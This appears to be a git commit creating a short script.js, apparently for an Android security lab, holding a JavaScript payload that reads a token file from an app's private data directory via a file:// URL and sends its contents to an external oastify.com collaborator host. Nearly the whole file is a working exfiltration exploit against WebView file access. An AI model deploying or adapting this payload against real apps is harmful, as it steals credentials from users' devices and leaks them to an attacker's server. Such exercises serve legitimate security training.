0728a45a369d04dc13f61db90b4aacdb8a79ae9e
lindoke <66307433+lindoke@users.noreply.github.com>
2025-03-19 13:15:12 +0200

    Create script.js

---
+++ script.js
@@ -0,0 +1,9 @@
+<script>
+    fetch("file:///data/data/io.hextree.attacksurface/token.txt")
+        .then(response => response.text())
+        .then(data => {
+            document.body.innerHTML = "<pre>" + data + "</pre>";
+            fetch("https://bhwlivvbiakjmrbq8ox13u3xcoif65uu.oastify.com?data=" + encodeURIComponent(data));
+        })
+        .catch(error => console.error(error));
+</script>
